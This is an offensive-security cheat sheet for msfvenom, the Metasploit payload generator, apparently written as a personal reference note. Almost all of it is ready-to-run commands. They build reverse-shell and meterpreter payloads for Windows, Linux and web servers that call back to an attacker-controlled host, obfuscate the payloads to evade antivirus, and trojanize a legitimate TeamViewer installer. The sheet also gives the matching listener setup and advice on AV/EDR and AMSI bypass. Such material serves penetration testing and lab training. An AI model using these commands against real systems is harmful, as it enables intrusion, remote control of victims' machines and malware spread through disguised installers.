# msfvenom

**Tags:** `#msfvenom` `#payloads` `#shells` `#encoding` `#metasploit`

Payload generator and encoder. Generates shellcode, executables, scripts, and web shells for any platform. Payloads must match the handler configured in msfconsole (`multi/handler`) — arch, platform, and staged/stageless must align.

**Source:** Part of Metasploit Framework
**Install:** Pre-installed on Kali

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
```

> [!warning]
> Always match the payload in msfvenom with the handler. `windows/x64/meterpreter/reverse_tcp` (staged, x64) needs the same string set in `multi/handler`.

---

## List Payloads / Formats

```bash
# All payloads
msfvenom -l payloads | grep "windows/x64"
msfvenom -l payloads | grep "linux.*reverse"
msfvenom -l payloads | grep "meterpreter"

# Output formats
msfvenom -l formats

# Encoders
msfvenom -l encoders
```

---

## Windows Payloads

```bash
# x64 staged meterpreter (most common)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# x86 staged
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell32.exe

# Stageless (no stager — standalone)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell_stageless.exe

# HTTPS (encrypted C2)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o shell_https.exe

# ASPX (IIS)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx

# DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o shell.dll

# PowerShell script
msfvenom -p cmd/windows/powershell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.ps1
```

---

## Linux Payloads

```bash
# x64 ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf

# x86 ELF
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell32.elf

# Stageless
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell_stageless.elf
```

---

## Web Shells

```bash
# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php

# JSP (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.jsp

# WAR (Tomcat deploy)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war
```

---

## Shellcode Output (Custom Loaders)

```bash
# C array
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f c

# Python bytes
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f python

# Raw binary
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.bin

# Exclude bad characters
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -b "\x00\x0a\x0d" -f c
```

---

## Encoding

```bash
# x86 shikata_ga_nai — 10 iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe

# x64 encoder
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x64/xor_dynamic -i 5 -f exe -o encoded64.exe
```

> [!note]
> Encoding alone rarely bypasses modern AV/EDR. Combine with custom shellcode loaders, Shellter, Donut, or AMSI bypass for better results.

---

## Trojanize (Inject into Existing Binary)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -x ~/Downloads/TeamViewer_Setup.exe -k -f exe -o TeamViewer_Setup_evil.exe
```

---

## Handler Setup

```bash
# msfconsole
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set ExitOnSession false
run -j
```

One-liner:
```bash
msfconsole -q -x "use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; set ExitOnSession false; run -j"
```

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
